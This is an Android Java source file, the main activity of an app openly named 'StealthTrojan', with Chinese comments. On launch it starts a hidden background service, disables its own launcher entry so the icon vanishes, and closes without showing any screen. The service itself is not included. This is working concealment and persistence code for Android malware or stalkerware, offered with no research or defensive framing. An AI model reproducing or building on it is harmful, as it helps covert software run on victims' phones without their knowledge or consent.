package com.stealthtrojan.app;

import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.app.Activity;
import android.util.Log;

public class MainActivity extends Activity {

    private static final String TAG = "StealthTrojan";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        try {
            // 启动隐藏服务
            Log.d(TAG, "Starting stealth service...");
            Intent serviceIntent = new Intent(this, StealthService.class);
            
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
            
            // 隐藏应用图标
            hideAppIcon();
            
        } catch (Exception e) {
            Log.e(TAG, "Error starting service", e);
        }
        
        // 立即关闭 Activity，不显示任何界面
        finish();
    }

    private void hideAppIcon() {
        try {
            PackageManager packageManager = getPackageManager();
            ComponentName component = new ComponentName(getPackageName(), getComponentName().getClassName());
            
            // 禁用 LAUNCHER 组件，隐藏图标
            if (packageManager.getComponentEnabledSetting(component) 
                    != PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
                packageManager.setComponentEnabledSetting(
                    component,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                );
                Log.d(TAG, "App icon hidden successfully");
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to hide app icon", e);
        }
    }
}
